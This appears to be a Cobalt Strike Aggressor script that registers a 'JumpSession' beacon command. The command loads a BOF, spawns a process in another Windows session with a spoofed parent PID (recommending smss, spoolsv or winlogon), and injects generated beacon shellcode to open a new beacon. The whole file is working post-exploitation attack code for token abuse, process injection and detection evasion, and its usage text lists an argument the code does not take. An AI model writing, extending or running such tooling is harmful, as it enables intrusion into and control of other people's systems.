alias JumpSession
{
    local('$sessionpid $parentpid $shellcode $sclen $shellfile $fp $args');
    if(!-isadmin $1)
    {
        berror($1, "You may only run this command from an Elevated beacon!");
        return;
    }

    $bid = $1;

    # Check number of arguments
    if(2 > size(@_) || 3 < size(@_) )
    {
        berror($bid, "Invalid number of arguments");
        berror($bid, beacon_command_detail("JumpSession"));
        return;
    }

    # Get the session PID
    if($2 < 0 || $2 > 65535)
    {
        berror($bid, "Invalid session PID");
        berror($bid, beacon_command_detail("JumpSession"));
        return;
    }

    # Get the parent PID
    if($3 < 0 || $3 > 65535)
    {
        berror($bid, "Invalid parent PID");
        berror($bid, beacon_command_detail("JumpSession"));
        return;
    }

	openPayloadHelper(lambda({
		btask($bids, "Executing JumpSession using Listener: $1 Session PID: $sessionpid Parent PID: $parentpid", "");
		Execute($bids, $1, $sessionpid, $parentpid);
	}, $bids => $1, $sessionpid => $2, $parentpid => $3));
}

sub Execute{
    #Figure out the arch of this session
    $barch  = barch($1);

    #Generate Shellcode
    $shellcode = artifact_payload($2, "raw", $barch);
    $sclen = strlen($shellcode);

    # read in the right BOF file
    $handle = openf(script_resource("JumpSession. $+ $barch $+ .o"));
    $data   = readb($handle, -1);
    closef($handle);

    # Pack the arguments
    $args = bof_pack($bid, "iibi", $3, $4, $shellcode, $sclen);

    # Execute BOF
    beacon_inline_execute($bid, $data, "go", $args);
}

beacon_command_register(
    "JumpSession",
    "JumpSession technique to spawn beacon in different session",
    "
Command: JumpSession 
Summary: This command spawns a new process in a different session and then injects shellcode to create a new beacon.
         WARNING! You are accessing process tokens and spawning processes and injecting shellcode, ensure you know what you are doing!
         CANNOT PPID spoof PPL processes.
Usage:   JumpSession <SESSION PID> <PARENT PID> <SHELLCODE>
         SESSION PID        Required. The PID of the process whose session you wish to
                                      Duplicate and spawn a new process under.
                                      Session 0: recommend smss
                                      User sessions: recommend winlogon

         PARENT PID         Required. The PID of the process to spoof as a parent.
                                      Select a process in the same session as you are spawning.
                                      Session 0: recommend spoolsv
                                      User sessions: recommend winlogon
"
);